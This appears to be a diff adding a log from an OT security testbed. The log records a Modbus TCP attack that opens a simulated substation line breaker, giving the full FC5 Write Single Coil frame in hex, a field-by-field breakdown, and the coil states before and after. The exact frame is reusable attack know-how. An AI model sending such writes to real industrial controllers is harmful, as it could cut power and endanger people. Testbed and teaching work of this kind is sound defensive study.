@@ -1,0 +1,54 @@
+============================================================
+  OT Security Testbed — Scenario 2: Command Injection
+  Target: 10.0.0.2:5502
+  Time:   2026-04-14T16:33:39
+============================================================
+[+] Connected to 10.0.0.2:5502
+
+[*] Pre-attack state:
+────────────────────────────────────────────────────────────
+  Coil 0  (line-650632.closed): True  (CLOSED — line energised)
+  Coil 1  (line-651634.closed): True  (CLOSED — line energised)
+  HR 30000 (line-650632.kW):     300
+  HR 30001 (line-651634.kW):     185
+
+[*] Modbus TCP Frame Breakdown (FC5 Write Single Coil)
+────────────────────────────────────────────────────────────
+  Full frame (hex): 00 01 00 00 00 06 01 05 00 00 00 00
+────────────────────────────────────────────────────────────
+  Field                     Bytes        Value      Meaning
+──────────────────────────────────────────────────────────────────────
+  Transaction ID            0001         1          Identifies this request
+  Protocol ID               0000         0          Always 0 for Modbus
+  Length                    0006         6          Bytes remaining (6)
+  Unit ID                   01           1          Slave address 1
+  Function Code             05           5 (FC5)    Write Single Coil
+  Coil Address              0000         0          Coil 0
+  Coil Value                0000         0xFF00=ON/0=OFF 0xFF00=CLOSED 0x0000=OPEN
+────────────────────────────────────────────────────────────
+  Intent: set coil 0 to False (OPEN)
+  Effect: line-650632.closed -> OPEN
+
+[!] Sending FC5 Write Coil 0 = False (OPEN) at 2026-04-14T16:33:39.053
+
+[*] Post-attack state:
+────────────────────────────────────────────────────────────
+  Coil 0  (line-650632.closed): False (OPEN  — line de-energised)
+  Coil 1  (line-651634.closed): True  (CLOSED — line energised)
+  HR 30000 (line-650632.kW):     300
+  HR 30001 (line-651634.kW):     185
+
+[*] Before / After Comparison
+════════════════════════════════════════════════════════════
+  Tag                            Before               After
+────────────────────────────────────────────────────────────
+  line-650632.closed (Coil 0)    True                 False
+  line-651634.closed (Coil 1)    True                 True
+  line-650632.kW    (HR 30000)   300                  300
+  line-651634.kW    (HR 30001)   185                  185
+════════════════════════════════════════════════════════════
+
+  *** ATTACK SUCCESSFUL ***
+  Coil 0 flipped: line-650632 changed from CLOSED to OPEN.
+  In a real substation this would de-energise the feeder circuit.
+
